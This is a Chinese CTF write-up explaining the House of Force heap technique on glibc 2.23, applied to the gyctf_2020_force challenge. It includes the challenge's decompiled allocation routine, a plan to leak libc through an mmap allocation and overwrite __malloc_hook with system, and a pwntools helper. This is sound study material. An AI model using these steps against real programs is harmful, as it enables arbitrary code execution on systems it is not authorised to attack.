House of force&&gyctf_2020_force

Feb 02, 2026

以glibc2.23为例

利用条件

  • 可以修改top chunk的size位
  • 对申请堆块的大小没有检测

原理，先修改top chunk的size，然后计算top chunk与任意地址的位置，申请一个大chunk，将top chunk地址改为我们要修改的地址附近，然后再次申请合适大小chunk后对该chunk进行修改就行实现任意地址写

unsigned __int64 add()
{
  const void **i; // [rsp+0h] [rbp-120h]
  __int64 size; // [rsp+8h] [rbp-118h]
  char s[256]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+118h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(s, 255, sizeof(s));
  for ( i = (const void **)&unk_202080; *i; ++i )
    ;
  if ( (char *)i - (char *)&unk_202080 > 39 )
    exit(0);
  puts("size");
  read(0, nptr, 0xFuLL);
  size = atol(nptr);
  *i = malloc(size);
  if ( !*i )
    exit(0);
  printf("bin addr %p\n", *i);
  puts("content");
  read(0, (void *)*i, 0x50uLL);
  puts("done");
  return __readfsqword(0x28u) ^ v4;
}

glibc 的 malloc 分配内存有两种核心方式，用 阈值 区分：当申请chunk大小小于阈值时，采用brk分配， 从进程heap段扩展，地址连续 ；当申请chunk大小大于阈值时，使用mmap分配， 向内核申请独立的内存，与libcbase偏移固定，所以可以用来泄露libcbase

提前将/bin/sh写入top，然后利用house of force修改malloc_hook为system,再次malloc时传入binsh(size值原本我们给的是数值,会把这个数值给 rdi，现在给的是 top chunk 地址，给 rdi 的值就是top chunk 的内容)

def add(size,content):
    p.recvuntil(b'2:puts')
    p.sendline(b'1')
    p.sendlineafter(b'size',str(size))
    p.recvuntil(b'0x')
    addr=int(p.recv(12),16)
    p.sendafter(b'content',content)
    return addr
